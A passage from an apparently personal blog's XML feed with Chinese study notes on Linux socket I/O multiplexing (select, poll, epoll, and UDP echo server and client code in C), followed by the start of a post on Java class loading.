class="title">FD_CLR</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//判断一个文件描述符是否在监听集合中</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_ISSET</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="使用select实现多路IO转接"><a href="#使用select实现多路IO转接" class="headerlink" title="使用select实现多路IO转接"></a>使用select实现多路IO转接</h5><p><code>server</code>端代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> listenfd,connfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">listenfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(listenfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(listenfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">fd_set rset,allset; <span class="comment">//定义 读集合，备份集合allset</span></span><br><span class="line">FD_ZERO(&amp;allset);  <span class="comment">//清空监听集合</span></span><br><span class="line">FD_SET(listenfd,&amp;allset); <span class="comment">//将待监听fd添加到监听集合中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret,maxfd = <span class="number">0</span>,i,n,j;</span><br><span class="line">maxfd = listenfd; <span class="comment">//最大文件描述符</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">rset = allset;  <span class="comment">//备份</span></span><br><span class="line">ret = select(maxfd+<span class="number">1</span>,&amp;rset,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>); <span class="comment">//使用select监听</span></span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"select error"</span>);</span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(listenfd,&amp;rset))&#123; <span class="comment">//listenfd满足监听的读事件</span></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line">connfd = Accept(listenfd,(struct sockaddr*)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">FD_SET(connfd,&amp;allset); <span class="comment">//将新产生的fd添加到监听集合中，监听数据读事件</span></span><br><span class="line"><span class="keyword">if</span>(maxfd &lt; connfd) <span class="comment">//修改maxfd</span></span><br><span class="line">maxfd = connfd;</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">1</span>) <span class="comment">//说明select只返回一个，并且是listenfd，后续指令无需执行</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=listenfd+<span class="number">1</span>;i&lt;=maxfd;i++)&#123; <span class="comment">//处理满足读事件的fd</span></span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(i,&amp;rset))&#123; <span class="comment">//找到满足读事件的那个fd</span></span><br><span class="line">n = read(i,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)&#123; <span class="comment">//检测到客户端已经关闭连接</span></span><br><span class="line">Close(i);</span><br><span class="line">FD_CLR(i,&amp;allset); <span class="comment">//将关闭的fd移除出监听集合</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"read error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">buf[j] = <span class="built_in">toupper</span>(buf[j]);</span><br><span class="line">write(i,buf,n);</span><br><span class="line">write(STDOUT_FILENO,buf,n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Close(listenfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义文件头<code>wrap.h</code>和封装函数<code>wrap.c</code>代码和之前的相同。</p><h5 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd *fds, <span class="keyword">nfds_t</span> nfds,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  fds: 监听的文件描述符数组</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span>&#123;</span></span><br><span class="line">      <span class="keyword">int</span> fd: 待监听的文件描述符</span><br><span class="line">      short events: 待监听的文件描述符对应的监听事件(POLLIN、POLLOUT、POLLERR)</span><br><span class="line">      short revents: 传入时，给<span class="number">0</span>。如果满足对应事件的话，返回非<span class="number">0</span>(POLLIN、POLLOUT、POLLERR)</span><br><span class="line">    &#125;</span><br><span class="line">  nfds: 监听数组的，实际有效监听个数</span><br><span class="line">  timeout: 超时时长</span><br><span class="line">    &gt;<span class="number">0</span>: 设置监听超时时长</span><br><span class="line">    <span class="number">-1</span>: 阻塞监听</span><br><span class="line">    <span class="number">0</span>: 非阻塞监听，轮询</span><br><span class="line">返回值</span><br><span class="line">    &gt;<span class="number">0</span> : 所有监听集合中，满足对应事件的总数</span><br><span class="line">    <span class="number">0</span> : 没有满足监听条件的文件描述符</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><p>read函数返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="number">0</span>: 实际读到的字节数</span><br><span class="line">=<span class="number">0</span>: socket中，表示对端关闭。close()</span><br><span class="line"><span class="number">-1</span>: 如果errno == EINTR 被异常中断，需要重启</span><br><span class="line">  如果errno == EAGAIN或EWOULDBLOCK 以非阻塞方式读数据，但是没有数据。需要再次读</span><br><span class="line">  如果errno == ECONNRESET 说明连接被重置，需要close()。移除监听队列</span><br></pre></td></tr></table></figure><p>poll的优点：</p><ul><li><p>自带数组结构。可以将监听事件集合和返回事件集合分离</p></li><li><p>扩展 监听上限，超出1024限制</p></li></ul><p>缺点</p><ul><li>不能跨平台。只能在Linux下使用</li><li>无法直接定位满足监听事件的文件描述符，编码难度较大</li></ul><h5 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line">  size: 创建的红黑树的监听节点数量(仅供内核参考)</span><br><span class="line">  返回值: 指向新创建的红黑树的根节点的fd。失败返回<span class="number">-1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd,<span class="keyword">int</span> op,<span class="keyword">int</span> fd,struct epoll_event *event)</span></span></span><br><span class="line">  epfd: epoll_create函数的返回值 epfd</span><br><span class="line">  op: 对该监听红黑树所做的操作</span><br><span class="line">    EPOLL_CTL_ADD 添加fd到 监听红黑树</span><br><span class="line">    EPOLL_CTL_MOD 修改fd在 监听红黑树上的监听事件</span><br><span class="line">    EPOLL_CTL_DEL 将一个fd从 监听红黑树上摘下(取消监听)</span><br><span class="line">  fd: 待监听的fd</span><br><span class="line">  event: 本质 <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> 结构体</span></span><br><span class="line"><span class="class">     <span class="title">events</span>:</span></span><br><span class="line">EPOLLIN、EPOLLOUT、EPOLLERR</span><br><span class="line"> data: 联合体</span><br><span class="line">           <span class="keyword">int</span> fd: 对应监听事件的fd</span><br><span class="line">           <span class="keyword">void</span> *ptr</span><br><span class="line">           <span class="keyword">uint32_t</span> u32 </span><br><span class="line">           <span class="keyword">uint64_t</span> u64</span><br><span class="line"> 返回值: 成功<span class="number">0</span> 失败返回<span class="number">-1</span> 设置errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd,struct epoll_event *events,<span class="keyword">int</span> maxevents,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line">  epfd: epoll_create函数的返回值 epfd</span><br><span class="line">  events: 传出参数，数组，满足监听条件的fd结构体</span><br><span class="line">  maxevents: 数组元素的总个数</span><br><span class="line">  timeout: </span><br><span class="line">    &gt;<span class="number">0</span>: 设置监听超时时长(毫秒)</span><br><span class="line">    <span class="number">-1</span>: 阻塞监听</span><br><span class="line">    <span class="number">0</span>: 非阻塞监听，轮询</span><br><span class="line">  返回值:</span><br><span class="line">&gt;<span class="number">0</span>: 满足监听的总个数，可以用作循环上限</span><br><span class="line">     <span class="number">0</span>: 没有fd满足监听事件</span><br><span class="line">    <span class="number">-1</span>: 失败。errno</span><br></pre></td></tr></table></figure><h5 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h5><p>EPOLL事件有两种模型</p><ul><li><p>Edge Triggered(ET)：边缘触发只有数据到来才触发，不管缓存区中是否还有数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">event.events = EPOLLIN | EPOLLET;</span><br></pre></td></tr></table></figure></li><li><p>Level Triggered(LT)：水平触发只要有数据都会触发</p></li></ul><h5 id="epoll反应堆模型"><a href="#epoll反应堆模型" class="headerlink" title="epoll反应堆模型"></a>epoll反应堆模型</h5><p>原来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket、bind、listen -- epoll_create创建监听红黑树 -- 返回epfd -- epoll_ctl()向树上添加一个监听fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_wait监听 -- 对应监听fd有事件产生 -- 返回监听满足数组 -- 判断返回数组元素 -- lfd满足 -- Accept -- cfd满足 -- read() -- 小写转大写 -- write回去</span><br></pre></td></tr></table></figure><p>反应堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket、bind、listen -- epoll_create创建监听红黑树 -- 返回epfd -- epoll_ctl()向树上添加一个监听fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_wait监听 -- 对应监听fd有事件产生 -- 返回监听满足数组 -- 判断返回数组元素 -- lfd满足 -- Accept -- cfd满足 -- read() -- 小写转大写 -- cfd从监听红黑树上摘下 -- EPOLLOUT -- 回调函数 -- epoll_ctl() -- PEOLL_CTL_ADD 重新放到红黑树上监听写事件 -- epoll_ctl() -- EPOLL_CTL_ADD 重新放到红黑树上监听读事件 -- epoll_wait监听</span><br></pre></td></tr></table></figure><h4 id="UDP并发服务器"><a href="#UDP并发服务器" class="headerlink" title="UDP并发服务器"></a>UDP并发服务器</h4><p><code>server</code>端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">char</span> str[INET_ADDRSTRLEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>,<span class="title">clit_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clit_addr_len;</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">lfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>); <span class="comment">//将tcp流式协议改为报式协议</span></span><br><span class="line"><span class="keyword">if</span>(lfd == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bind(lfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Accepting connections ... \n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">clit_addr_len = <span class="keyword">sizeof</span>(clit_addr);</span><br><span class="line">ret = recvfrom(lfd,buf,BUFSIZ,<span class="number">0</span>,(struct sockaddr *)&amp;clit_addr,&amp;clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"recvfrom eror"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"received from %s at PORT %d\n"</span>,inet_ntop(AF_INET,&amp;clit_addr.sin_addr,str,<span class="keyword">sizeof</span>(str)),ntohs(clit_addr.sin_port));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">ret=sendto(lfd,buf,ret,<span class="number">0</span>,(struct sockaddr *)&amp;clit_addr,clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sendto error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(lfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>client</code>端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sockfd,n;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line">sockfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bzero(&amp;servaddr,<span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;servaddr.sin_addr);</span><br><span class="line">servaddr.sin_port = htons(SERV_PORT);</span><br><span class="line"><span class="comment">//bind(sockfd,(struct sockaddr *)&amp;servaddr,sizeof(servaddr));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(fgets(buf,BUFSIZ,<span class="built_in">stdin</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">n = sendto(sockfd,buf,<span class="built_in">strlen</span>(buf),<span class="number">0</span>,(struct sockaddr *)&amp;servaddr,<span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sendto error"</span>);</span><br><span class="line">n = recvfrom(sockfd,buf,BUFSIZ,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"recvfrom error"</span>);</span><br><span class="line">write(STDOUT_FILENO,buf,n);</span><br><span class="line">&#125;</span><br><span class="line">close(sockfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Socket编程&quot;&gt;&lt;a href=&quot;#Socket编程&quot; class=&quot;headerlink&quot; title=&quot;Socket编程&quot;&gt;&lt;/a&gt;Socket编程&lt;/h4&gt;&lt;h5 id=&quot;套接字概念&quot;&gt;&lt;a href=&quot;#套接字概念&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java类加载</title>
    <link href="elssm.github.io/2021/10/30/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>elssm.github.io/2021/10/30/Java类加载/</id>
    <published>2021-10-30T14:47:18.000Z</published>
    <updated>2021-10-31T10:04:12.792Z</updated>
    
    <content type="html"><![CDATA[<h4 id="类的加载概述"><a href="#类的加载概述" class="headerlink" title="类的加载概述"></a>类的加载概述</h4><p>我们编写的<code>.java</code>扩展名的源代码文件存储着要执行的程序逻辑，这些文件需要经过<code>java</code>编译器编译成<code>.class</code>文件，<code>.class</code>文件中存放着编译后虚拟机指令的二进制信息。当需要用到某个类时，虚拟机将会加载它，并在内存中创建对应的<code>class</code>对象，这个过程称之为类的加载。一个类的生命周期从类被加载、连接和初始化开始，只有在虚拟机内存中，我们的<code>java</code>程序才可以使用它。</p><p><img src="/2021/10/30/Java类加载/1.png" alt="1"></p><h5 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h5><p>通过类的完全限定名(包名和类名)查找此类的字节码文件，把类的<code>.class</code>文件中的二进制数据读入到内存中，并存放在运行时数据区的方法区中，然后利用字节码文件创建一个<code>Class</code>对象，用来封装类在方法区内的数据结构并存放在堆区内，这个过程是由类加载器完成的。</p><h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><ul><li>验证：确保被加载类的正确性。<code>Class</code>文件的字节流中包含的信息符合当前虚拟机要求，不会危害虚拟机自身安全。</li><li>准备：为类的静态变量分配内存，并将其初始化为默认值，此阶段仅仅只为静态变量(即<code>static</code>修饰的字段变量)分配内存，并且设置该变量的初始值。对于<code>final static</code>修饰的变量，编译的时候就会分配了，也不会分配实例变量的内存。</li><li>解析：把类中的符号引用转换为直接引用，符号引用就是一组符号来描述目标，而直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。</li></ul><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p>类加载最后阶段，若该类具有父类，则先对父类进行初始化，执行静态变量赋值和静态代码块代码，成员变量也将被初始化。</p><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>类的加载是由类加载器完成的，类加载器可以分为两种：第一种是Java虚拟机自带的类加载器，分别为启动类加载器、扩展类加载器和系统类加载器。第二种是用户自定义的类加载器，是<code>java.lang.ClassLoader</code>的子类实例。</p><h5 id="虚拟机内置类加载器"><a href="#虚拟机内置类加载器" class="headerlink" title="虚拟机内置类加载器"></a>虚拟机内置类加载器</h5><h6 